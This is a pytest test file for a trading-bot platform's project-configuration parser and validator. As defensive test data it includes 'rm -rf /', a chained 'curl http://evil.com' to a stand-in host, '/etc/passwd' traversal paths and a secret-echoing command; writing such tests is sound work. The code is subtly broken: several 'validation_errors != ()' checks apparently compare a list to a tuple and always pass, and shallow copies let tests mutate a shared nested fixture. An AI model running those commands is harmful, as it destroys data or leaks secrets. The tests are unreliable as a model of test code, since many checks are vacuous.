"""Tests for ENGPLAT-001 project configuration contract.

Covers:
- parse_project_config() structural parsing
- validate_project_config() semantic validation
- ProjectConfig, GovernanceFiles, WorkflowFiles dataclasses
- ProjectRegistry.from_projects() duplicate detection
- Frozen model behavior
- Error sanitization
"""

from __future__ import annotations

from dataclasses import FrozenInstanceError
from pathlib import Path
import pytest

from engineering.models import (
    DuplicateProjectId,
    GovernanceFiles,
    ParseResult,
    ProjectConfig,
    ProjectRegistry,
    WorkflowFiles,
    parse_project_config,
    validate_project_config,
)


# ---------------------------------------------------------------------------
# Test fixtures
# ---------------------------------------------------------------------------

# Minimal valid mapping representing trading-bot
_VALID_MAPPING = {
    "schema_version": "1.0",
    "project_id": "trading-bot",
    "display_name": "Trading Bot",
    "repository_root": str(Path.cwd()),
    "authoritative_base_branch": "main",
    "governance_files": {
        "backlog_path": str(Path.cwd() / "AGENT_BACKLOG.md"),
        "operating_plan_path": str(Path.cwd() / "AGENT_OPERATING_PLAN.md"),
        "owners_path": str(Path.cwd() / "OWNERS.md"),
        "handoff_path": str(Path.cwd() / "TRADING_BOT_AUTONOMOUS_ENGINEERING_HANDOFF.md"),
    },
    "workflow_files": {
        "workflow_store_path": str(Path.cwd() / "engineering" / "workflow_store.json"),
        "event_store_path": str(Path.cwd() / "engineering" / "event_store.db"),
        "report_dir": str(Path.cwd() / "reports"),
    },
    "qa_commands": ("python -m pytest tests/ -q",),
    "qa_timeout_seconds": 300,
    "prohibited_operations": ("no_live_trading",),
    "agents_may_merge": False,
    "owner_ids": ("josh",),
    "agent_owners": ("trading-manager",),
}


def _valid_config() -> ProjectConfig:
    """Return a valid ProjectConfig built from the valid mapping."""
    result = parse_project_config(_VALID_MAPPING)
    assert result.config is not None, f"Valid mapping failed to parse: {result.errors}"
    assert result.errors == (), f"Valid mapping had errors: {result.errors}"
    return result.config


# ---------------------------------------------------------------------------
# Test 1: Valid trading-bot mapping parses successfully
# ---------------------------------------------------------------------------

def test_valid_trading_bot_mapping_parses() -> None:
    result = parse_project_config(_VALID_MAPPING)
    assert result.config is not None
    assert result.errors == ()
    assert result.warnings == ()
    assert isinstance(result.config, ProjectConfig)


def test_valid_config_semantic_validation_passes() -> None:
    config = _valid_config()
    validation_errors = validate_project_config(config)
    assert validation_errors == [], f"Expected no validation errors, got: {validation_errors}"


def test_valid_config_roundtrip_through_parse_and_validate() -> None:
    """The full parse-then-validate pipeline must return zero errors for valid input."""
    result = parse_project_config(_VALID_MAPPING)
    assert result.config is not None
    validation_errors = validate_project_config(result.config)
    assert validation_errors == [], f"Expected no validation errors, got: {validation_errors}"


# ---------------------------------------------------------------------------
# Test 2: Model is frozen — mutation raises FrozenInstanceError
# ---------------------------------------------------------------------------

def test_project_config_is_frozen() -> None:
    config = _valid_config()
    with pytest.raises(FrozenInstanceError):
        config.project_id = "other"  # type: ignore[misc]


def test_governance_files_is_frozen() -> None:
    gf = GovernanceFiles(
        backlog_path=Path("/a"),
        operating_plan_path=Path("/b"),
        owners_path=Path("/c"),
        handoff_path=Path("/d"),
    )
    with pytest.raises(FrozenInstanceError):
        gf.backlog_path = Path("/x")  # type: ignore[misc]


def test_workflow_files_is_frozen() -> None:
    wf = WorkflowFiles(
        workflow_store_path=Path("/a"),
        event_store_path=Path("/b"),
        report_dir=Path("/c"),
    )
    with pytest.raises(FrozenInstanceError):
        wf.report_dir = Path("/x")  # type: ignore[misc]


# ---------------------------------------------------------------------------
# Test 3: Missing required fields → ParseError (not TypeError)
# ---------------------------------------------------------------------------

def test_missing_required_field_project_id_returns_error() -> None:
    mapping = dict(_VALID_MAPPING)
    del mapping["project_id"]
    result = parse_project_config(mapping)
    assert result.config is None
    assert result.errors != ()
    assert any("project_id" in e and "missing" in e for e in result.errors)


def test_missing_required_field_repository_root_returns_error() -> None:
    mapping = dict(_VALID_MAPPING)
    del mapping["repository_root"]
    result = parse_project_config(mapping)
    assert result.config is None
    assert result.errors != ()
    assert any("repository_root" in e and "missing" in e for e in result.errors)


def test_missing_required_field_display_name_returns_error() -> None:
    mapping = dict(_VALID_MAPPING)
    del mapping["display_name"]
    result = parse_project_config(mapping)
    assert result.config is None
    assert result.errors != ()
    assert any("display_name" in e and "missing" in e for e in result.errors)


def test_missing_required_field_authoritative_base_branch_returns_error() -> None:
    mapping = dict(_VALID_MAPPING)
    del mapping["authoritative_base_branch"]
    result = parse_project_config(mapping)
    assert result.config is None
    assert result.errors != ()


def test_missing_required_field_governance_files_returns_error() -> None:
    mapping = dict(_VALID_MAPPING)
    del mapping["governance_files"]
    result = parse_project_config(mapping)
    assert result.config is None
    assert result.errors != ()


def test_missing_required_field_workflow_files_returns_error() -> None:
    mapping = dict(_VALID_MAPPING)
    del mapping["workflow_files"]
    result = parse_project_config(mapping)
    assert result.config is None
    assert result.errors != ()


# ---------------------------------------------------------------------------
# Test 4: Unknown fields are rejected
# ---------------------------------------------------------------------------

def test_unknown_field_returns_error() -> None:
    mapping = dict(_VALID_MAPPING)
    mapping["unknown_field"] = "value"
    result = parse_project_config(mapping)
    assert result.config is None
    assert any("unknown field" in e for e in result.errors)


def test_multiple_unknown_fields_returns_multiple_errors() -> None:
    mapping = dict(_VALID_MAPPING)
    mapping["unknown_a"] = "a"
    mapping["unknown_b"] = "b"
    result = parse_project_config(mapping)
    assert result.config is None
    error_strings = "\n".join(result.errors)
    assert "unknown_a" in error_strings
    assert "unknown_b" in error_strings


# ---------------------------------------------------------------------------
# Test 5: Wrong field type → ParseError
# ---------------------------------------------------------------------------

def test_wrong_type_qa_timeout_seconds_string_returns_error() -> None:
    mapping = dict(_VALID_MAPPING)
    mapping["qa_timeout_seconds"] = "not_an_int"
    result = parse_project_config(mapping)
    assert result.config is None
    assert any("qa_timeout_seconds" in e and "int" in e for e in result.errors)


def test_wrong_type_agents_may_merge_string_returns_error() -> None:
    mapping = dict(_VALID_MAPPING)
    mapping["agents_may_merge"] = "not_a_bool"
    result = parse_project_config(mapping)
    assert result.config is None
    assert any("agents_may_merge" in e and "bool" in e for e in result.errors)


def test_wrong_type_qa_commands_string_returns_error() -> None:
    mapping = dict(_VALID_MAPPING)
    mapping["qa_commands"] = "not_a_tuple"
    result = parse_project_config(mapping)
    assert result.config is None
    assert any("qa_commands" in e and "tuple" in e for e in result.errors)


def test_wrong_type_owner_ids_string_returns_error() -> None:
    mapping = dict(_VALID_MAPPING)
    mapping["owner_ids"] = "josh"  # should be list/tuple
    result = parse_project_config(mapping)
    assert result.config is None
    assert any("owner_ids" in e and "tuple" in e for e in result.errors)


# ---------------------------------------------------------------------------
# Test 6: Unsupported schema_version → ParseError
# ---------------------------------------------------------------------------

def test_unsupported_schema_version_returns_error() -> None:
    mapping = dict(_VALID_MAPPING)
    mapping["schema_version"] = "2.0"
    result = parse_project_config(mapping)
    assert result.config is None
    assert any(
        "schema_version" in e and "unsupported" in e and "2.0" in e
        for e in result.errors
    ), f"Expected unsupported-version error, got: {result.errors}"


def test_schema_version_empty_string_returns_error() -> None:
    mapping = dict(_VALID_MAPPING)
    mapping["schema_version"] = ""
    result = parse_project_config(mapping)
    assert result.config is None
    assert result.errors != ()


# ---------------------------------------------------------------------------
# Test 7: Missing schema_version key entirely → ParseError
# ---------------------------------------------------------------------------

def test_missing_schema_version_returns_error() -> None:
    mapping = dict(_VALID_MAPPING)
    del mapping["schema_version"]
    result = parse_project_config(mapping)
    assert result.config is None
    assert any("schema_version" in e and "missing" in e for e in result.errors)


# ---------------------------------------------------------------------------
# Test 8: Empty project_id passes parse, fails semantic validate
# ---------------------------------------------------------------------------

def test_empty_project_id_passes_parse_but_fails_validate() -> None:
    mapping = dict(_VALID_MAPPING)
    mapping["project_id"] = ""
    result = parse_project_config(mapping)
    # Structural parse succeeds (type is correct)
    assert result.config is not None
    # Semantic validation fails
    validation_errors = validate_project_config(result.config)
    assert validation_errors != ()
    assert any("project_id" in e and "empty" in e for e in validation_errors)


# ---------------------------------------------------------------------------
# Test 9: Invalid repository_root (does not exist) → ValidationError
# ---------------------------------------------------------------------------

def test_invalid_repository_root_returns_error() -> None:
    mapping = dict(_VALID_MAPPING)
    mapping["repository_root"] = "/this/path/does/not/exist/12345"
    result = parse_project_config(mapping)
    assert result.config is not None  # structural parse OK
    validation_errors = validate_project_config(result.config)
    assert validation_errors != ()
    assert any("repository_root" in e and "does not exist" in e for e in validation_errors)


# ---------------------------------------------------------------------------
# Test 10: Path traversal in governance path → ValidationError
# ---------------------------------------------------------------------------

def test_path_traversal_in_backlog_path_returns_error() -> None:
    mapping = dict(_VALID_MAPPING)
    mapping["governance_files"]["backlog_path"] = str(
        Path.cwd() / ".." / ".." / "etc" / "passwd"
    )
    result = parse_project_config(mapping)
    assert result.config is not None
    validation_errors = validate_project_config(result.config)
    assert validation_errors != ()
    assert any(
        "backlog_path" in e and ("escapes" in e or "traversal" in e or "resolve" in e)
        for e in validation_errors
    ), f"Expected path-escape error, got: {validation_errors}"


def test_relative_path_in_backlog_path_returns_error() -> None:
    """A path with '..' components that resolves outside repo_root fails."""
    mapping = dict(_VALID_MAPPING)
    # This path resolves to /etc/passwd or similar when .. is followed
    mapping["governance_files"]["backlog_path"] = "../../../outside"
    result = parse_project_config(mapping)
    assert result.config is not None
    validation_errors = validate_project_config(result.config)
    assert validation_errors != ()


# ---------------------------------------------------------------------------
# Test 11: Resolved path outside repository_root → ValidationError
# ---------------------------------------------------------------------------

def test_resolved_path_outside_repository_root_returns_error() -> None:
    """A symlink or relative path that resolves outside repo_root fails."""
    mapping = dict(_VALID_MAPPING)
    # Use an absolute path that is outside repo_root
    mapping["governance_files"]["backlog_path"] = "/tmp/../../../etc/passwd"
    result = parse_project_config(mapping)
    assert result.config is not None
    validation_errors = validate_project_config(result.config)
    assert validation_errors != ()
    assert any(
        "backlog_path" in e and ("escapes" in e or "resolve" in e)
        for e in validation_errors
    ), f"Expected path-escape error, got: {validation_errors}"


# ---------------------------------------------------------------------------
# Test 12: Required governance file missing → ValidationError
# ---------------------------------------------------------------------------

def test_missing_required_governance_file_returns_error(tmp_path: Path) -> None:
    """A required governance file that does not exist produces a ValidationError."""
    # Create minimal governance structure without AGENT_BACKLOG.md
    (tmp_path / "AGENT_OPERATING_PLAN.md").touch()
    (tmp_path / "OWNERS.md").touch()
    (tmp_path / "TRADING_BOT_AUTONOMOUS_ENGINEERING_HANDOFF.md").touch()
    (tmp_path / "engineering").mkdir()
    (tmp_path / "engineering" / "workflow_store.json").touch()
    (tmp_path / "engineering" / "event_store.db").touch()
    (tmp_path / "reports").mkdir()

    mapping = dict(_VALID_MAPPING)
    mapping["repository_root"] = str(tmp_path)
    mapping["governance_files"] = {
        "backlog_path": str(tmp_path / "AGENT_BACKLOG.md"),  # does NOT exist
        "operating_plan_path": str(tmp_path / "AGENT_OPERATING_PLAN.md"),
        "owners_path": str(tmp_path / "OWNERS.md"),
        "handoff_path": str(tmp_path / "TRADING_BOT_AUTONOMOUS_ENGINEERING_HANDOFF.md"),
    }
    mapping["workflow_files"] = {
        "workflow_store_path": str(tmp_path / "engineering" / "workflow_store.json"),
        "event_store_path": str(tmp_path / "engineering" / "event_store.db"),
        "report_dir": str(tmp_path / "reports"),
    }

    result = parse_project_config(mapping)
    assert result.config is not None
    validation_errors = validate_project_config(result.config)
    assert validation_errors != ()
    assert any(
        "backlog_path" in e and "does not exist" in e
        for e in validation_errors
    ), f"Expected missing-file error, got: {validation_errors}"


# ---------------------------------------------------------------------------
# Test 13: Missing workflow file parent directory → ValidationError (not exception)
# ---------------------------------------------------------------------------

def test_missing_workflow_file_parent_returns_error(tmp_path: Path) -> None:
    """A workflow file whose parent directory does not exist produces an error."""
    mapping = dict(_VALID_MAPPING)
    mapping["repository_root"] = str(tmp_path)
    mapping["governance_files"] = {
        "backlog_path": str(tmp_path / "AGENT_BACKLOG.md"),
        "operating_plan_path": str(tmp_path / "AGENT_OPERATING_PLAN.md"),
        "owners_path": str(tmp_path / "OWNERS.md"),
        "handoff_path": str(tmp_path / "TRADING_BOT_AUTONOMOUS_ENGINEERING_HANDOFF.md"),
    }
    # engineering/ does NOT exist — workflow_store_path parent is missing
    mapping["workflow_files"] = {
        "workflow_store_path": str(tmp_path / "engineering" / "workflow_store.json"),
        "event_store_path": str(tmp_path / "engineering" / "event_store.db"),
        "report_dir": str(tmp_path / "reports"),
    }

    result = parse_project_config(mapping)
    assert result.config is not None
    validation_errors = validate_project_config(result.config)
    assert validation_errors != ()
    assert any(
        "workflow_store_path" in e and "parent directory" in e and "does not exist" in e
        for e in validation_errors
    ), f"Expected parent-missing error, got: {validation_errors}"


# ---------------------------------------------------------------------------
# Test 14: agents_may_merge=True with no approval policy → ValidationError
# ---------------------------------------------------------------------------

def test_agents_may_merge_true_without_approval_policy_returns_error() -> None:
    mapping = dict(_VALID_MAPPING)
    mapping["agents_may_merge"] = True
    result = parse_project_config(mapping)
    assert result.config is not None
    validation_errors = validate_project_config(result.config)
    assert validation_errors != ()
    assert any(
        "agents_may_merge" in e and "False" in e
        for e in validation_errors
    ), f"Expected agents_may_merge conflict error, got: {validation_errors}"


# ---------------------------------------------------------------------------
# Test 15: Unsafe QA command — rm -rf
# ---------------------------------------------------------------------------

def test_unsafe_qa_command_rm_rf_returns_error() -> None:
    mapping = dict(_VALID_MAPPING)
    mapping["qa_commands"] = ("rm -rf /", "python -m pytest tests/")
    result = parse_project_config(mapping)
    assert result.config is not None
    validation_errors = validate_project_config(result.config)
    assert validation_errors != ()
    assert any(
        "qa_commands" in e and "destructive" in e
        for e in validation_errors
    ), f"Expected destructive command error, got: {validation_errors}"


# ---------------------------------------------------------------------------
# Test 16: Unsafe QA command — --live
# ---------------------------------------------------------------------------

def test_unsafe_qa_command_live_flag_returns_error() -> None:
    mapping = dict(_VALID_MAPPING)
    mapping["qa_commands"] = ("python -m pytest tests/ --live",)
    result = parse_project_config(mapping)
    assert result.config is not None
    validation_errors = validate_project_config(result.config)
    assert validation_errors != ()
    assert any(
        "qa_commands" in e and "live-trading" in e
        for e in validation_errors
    ), f"Expected live-trading flag error, got: {validation_errors}"


# ---------------------------------------------------------------------------
# Test 17: Unsafe QA command — && curl
# ---------------------------------------------------------------------------

def test_unsafe_qa_command_shell_operator_returns_error() -> None:
    mapping = dict(_VALID_MAPPING)
    mapping["qa_commands"] = ("python -m pytest tests/ && curl http://evil.com",)
    result = parse_project_config(mapping)
    assert result.config is not None
    validation_errors = validate_project_config(result.config)
    assert validation_errors != ()
    assert any(
        "qa_commands" in e and ("shell operator" in e or "curl" in e)
        for e in validation_errors
    ), f"Expected shell-operator error, got: {validation_errors}"


# ---------------------------------------------------------------------------
# Test 18: Non-positive timeout → ValidationError
# ---------------------------------------------------------------------------

def test_qa_timeout_seconds_zero_returns_error() -> None:
    mapping = dict(_VALID_MAPPING)
    mapping["qa_timeout_seconds"] = 0
    result = parse_project_config(mapping)
    assert result.config is not None
    validation_errors = validate_project_config(result.config)
    assert validation_errors != ()
    assert any(
        "qa_timeout_seconds" in e and "positive" in e
        for e in validation_errors
    ), f"Expected positive-timeout error, got: {validation_errors}"


def test_qa_timeout_seconds_negative_returns_error() -> None:
    mapping = dict(_VALID_MAPPING)
    mapping["qa_timeout_seconds"] = -10
    result = parse_project_config(mapping)
    assert result.config is not None
    validation_errors = validate_project_config(result.config)
    assert validation_errors != ()
    assert any(
        "qa_timeout_seconds" in e and "positive" in e
        for e in validation_errors
    ), f"Expected positive-timeout error, got: {validation_errors}"


# ---------------------------------------------------------------------------
# Test 19: Duplicate owner_ids → ValidationError
# ---------------------------------------------------------------------------

def test_duplicate_owner_ids_returns_error() -> None:
    mapping = dict(_VALID_MAPPING)
    mapping["owner_ids"] = ("josh", "josh")  # duplicate
    result = parse_project_config(mapping)
    assert result.config is not None
    validation_errors = validate_project_config(result.config)
    assert validation_errors != ()
    assert any(
        "owner_ids" in e and "duplicate" in e
        for e in validation_errors
    ), f"Expected duplicate owner_ids error, got: {validation_errors}"


def test_duplicate_agent_owners_returns_error() -> None:
    mapping = dict(_VALID_MAPPING)
    mapping["agent_owners"] = ("trading-manager", "trading-manager")
    result = parse_project_config(mapping)
    assert result.config is not None
    validation_errors = validate_project_config(result.config)
    assert validation_errors != ()
    assert any(
        "agent_owners" in e and "duplicate" in e
        for e in validation_errors
    ), f"Expected duplicate agent_owners error, got: {validation_errors}"


# ---------------------------------------------------------------------------
# Test 20: Empty owner_ids → ValidationError
# ---------------------------------------------------------------------------

def test_empty_owner_ids_returns_error() -> None:
    mapping = dict(_VALID_MAPPING)
    mapping["owner_ids"] = ()
    result = parse_project_config(mapping)
    assert result.config is not None
    validation_errors = validate_project_config(result.config)
    assert validation_errors != ()
    assert any(
        "owner_ids" in e and "empty" in e
        for e in validation_errors
    ), f"Expected empty owner_ids error, got: {validation_errors}"


def test_empty_agent_owners_returns_error() -> None:
    mapping = dict(_VALID_MAPPING)
    mapping["agent_owners"] = ()
    result = parse_project_config(mapping)
    assert result.config is not None
    validation_errors = validate_project_config(result.config)
    assert validation_errors != ()
    assert any(
        "agent_owners" in e and "empty" in e
        for e in validation_errors
    ), f"Expected empty agent_owners error, got: {validation_errors}"


# ---------------------------------------------------------------------------
# Test 21: ProjectRegistry.from_projects — distinct IDs → builds successfully
# ---------------------------------------------------------------------------

def test_registry_from_projects_with_distinct_ids_builds() -> None:
    config_a = _valid_config()
    config_b_dict = dict(_VALID_MAPPING)
    config_b_dict["project_id"] = "other-project"
    config_b_dict["display_name"] = "Other Project"
    result_b = parse_project_config(config_b_dict)
    assert result_b.config is not None
    config_b = result_b.config

    registry = ProjectRegistry.from_projects([config_a, config_b])
    assert registry.projects["trading-bot"] is config_a
    assert registry.projects["other-project"] is config_b
    assert len(registry.projects) == 2


# ---------------------------------------------------------------------------
# Test 22: ProjectRegistry.from_projects — duplicate IDs → raises DuplicateProjectId
# ---------------------------------------------------------------------------

def test_registry_from_projects_duplicate_id_raises() -> None:
    config_a = _valid_config()
    # Build a second config with the same project_id
    config_b_dict = dict(_VALID_MAPPING)
    # project_id is the same
    config_b_dict["display_name"] = "Other Display Name"
    result_b = parse_project_config(config_b_dict)
    assert result_b.config is not None
    config_b = result_b.config

    with pytest.raises(DuplicateProjectId) as exc_info:
        ProjectRegistry.from_projects([config_a, config_b])
    assert exc_info.value.project_id == "trading-bot"


# ---------------------------------------------------------------------------
# Test 23: Registry preserves identity (roundtrip)
# ---------------------------------------------------------------------------

def test_registry_roundtrip_preserves_identity() -> None:
    config_a = _valid_config()
    config_b_dict = dict(_VALID_MAPPING)
    config_b_dict["project_id"] = "project-b"
    config_b_dict["display_name"] = "Project B"
    result_b = parse_project_config(config_b_dict)
    assert result_b.config is not None
    config_b = result_b.config

    registry = ProjectRegistry.from_projects([config_a, config_b])
    projects_dict = registry.projects
    assert projects_dict["trading-bot"].project_id == "trading-bot"
    assert projects_dict["project-b"].project_id == "project-b"


# ---------------------------------------------------------------------------
# Test 24: Error messages are sanitized — contain no credentials or secrets
# ---------------------------------------------------------------------------

def test_error_messages_are_sanitized_no_credentials() -> None:
    """Verify error messages do not expose credential patterns."""
    # Use a mapping that produces errors
    mapping = dict(_VALID_MAPPING)
    mapping["qa_commands"] = ("echo $SECRET_API_KEY",)
    result = parse_project_config(mapping)
    assert result.config is not None
    validation_errors = validate_project_config(result.config)

    error_text = "\n".join(validation_errors)
    # Should contain the field name and category but not the actual value
    assert "qa_commands" in error_text
    # Should NOT expose the secret value
    assert "SECRET_API_KEY" not in error_text


def test_error_messages_are_field_name_only() -> None:
    """Error messages should reference field names, not arbitrary file contents."""
    mapping = dict(_VALID_MAPPING)
    mapping["qa_commands"] = ("echo dangerous",)
    result = parse_project_config(mapping)
    assert result.config is not None
    validation_errors = validate_project_config(result.config)
    assert validation_errors != ()
    # Field names should appear
    assert any("qa_commands" in e for e in validation_errors)
    # Error messages are strings — they may contain the command prefix but not arbitrary file content
    for err in validation_errors:
        assert not err.startswith("Traceback"), f"Traceback leaked: {err}"
        assert "import " not in err or "Field" in err, f"Import leaked: {err}"


# ---------------------------------------------------------------------------
# Test 25: ParseResult is immutable (frozen dataclass)
# ---------------------------------------------------------------------------

def test_parse_result_is_frozen() -> None:
    result = ParseResult(config=None, errors=("error",), warnings=())
    with pytest.raises(FrozenInstanceError):
        result.errors = ()  # type: ignore[misc]


# ---------------------------------------------------------------------------
# Test 26: schema_version default "1.0" when omitted in mapping
# ---------------------------------------------------------------------------

def test_schema_version_not_in_mapping_but_accepted_as_default() -> None:
    """When schema_version is absent from the mapping (not just None), it is an error.

    A missing schema_version means the client did not provide it — which must be
    treated as a structural error, not silently defaulted.
    """
    mapping = dict(_VALID_MAPPING)
    assert "schema_version" in mapping  # precondition
    # Removing schema_version should produce an error
    del mapping["schema_version"]
    result = parse_project_config(mapping)
    assert result.config is None
    assert any("schema_version" in e and "missing" in e for e in result.errors)


# ---------------------------------------------------------------------------
# Test 27: QA commands — empty tuple passes parse but fails validate
# ---------------------------------------------------------------------------

def test_empty_qa_commands_passes_parse_but_fails_validate() -> None:
    mapping = dict(_VALID_MAPPING)
    mapping["qa_commands"] = ()
    result = parse_project_config(mapping)
    assert result.config is not None
    validation_errors = validate_project_config(result.config)
    assert validation_errors != ()
    assert any(
        "qa_commands" in e and "empty" in e
        for e in validation_errors
    ), f"Expected empty qa_commands error, got: {validation_errors}"


# ---------------------------------------------------------------------------
# Test 28: repository_root not absolute → ValidationError
# ---------------------------------------------------------------------------

def test_repository_root_not_absolute_returns_error() -> None:
    mapping = dict(_VALID_MAPPING)
    mapping["repository_root"] = "relative/path"
    result = parse_project_config(mapping)
    assert result.config is not None
    validation_errors = validate_project_config(result.config)
    assert validation_errors != ()
    assert any(
        "repository_root" in e and "absolute" in e
        for e in validation_errors
    ), f"Expected non-absolute error, got: {validation_errors}"


# ---------------------------------------------------------------------------
# Test 29: GovernanceFiles unknown sub-field → error
# ---------------------------------------------------------------------------

def test_governance_files_unknown_subfield_returns_error() -> None:
    mapping = dict(_VALID_MAPPING)
    mapping["governance_files"]["extra_field"] = "/some/path"
    result = parse_project_config(mapping)
    assert result.config is None
    assert any(
        "governance_files" in e and "unknown" in e
        for e in result.errors
    ), f"Expected unknown subfield error, got: {result.errors}"


# ---------------------------------------------------------------------------
# Test 30: WorkflowFiles unknown sub-field → error
# ---------------------------------------------------------------------------

def test_workflow_files_unknown_subfield_returns_error() -> None:
    mapping = dict(_VALID_MAPPING)
    mapping["workflow_files"]["unknown_key"] = "/some/path"
    result = parse_project_config(mapping)
    assert result.config is None
    assert any(
        "workflow_files" in e and "unknown" in e
        for e in result.errors
    ), f"Expected unknown subfield error, got: {result.errors}"


# ---------------------------------------------------------------------------
# Test 31: Valid trading-bot constant (TRADING_BOT_PROJECT)
# ---------------------------------------------------------------------------

def test_trading_bot_project_constant_is_valid() -> None:
    from engineering.models import TRADING_BOT_PROJECT
    assert isinstance(TRADING_BOT_PROJECT, ProjectConfig)
    assert TRADING_BOT_PROJECT.schema_version == "1.0"
    assert TRADING_BOT_PROJECT.project_id == "trading-bot"
    assert TRADING_BOT_PROJECT.agents_may_merge is False
    assert TRADING_BOT_PROJECT.qa_timeout_seconds > 0
    assert len(TRADING_BOT_PROJECT.qa_commands) > 0
    assert "no_live_trading" in TRADING_BOT_PROJECT.prohibited_operations


def test_trading_bot_project_passes_parse_and_validate() -> None:
    from engineering.models import TRADING_BOT_PROJECT
    from dataclasses import asdict
    mapping = asdict(TRADING_BOT_PROJECT)
    result = parse_project_config(mapping)
    assert result.config is not None, f"Parse errors: {result.errors}"
    validation_errors = validate_project_config(result.config)
    assert validation_errors == [], f"Validation errors: {validation_errors}"
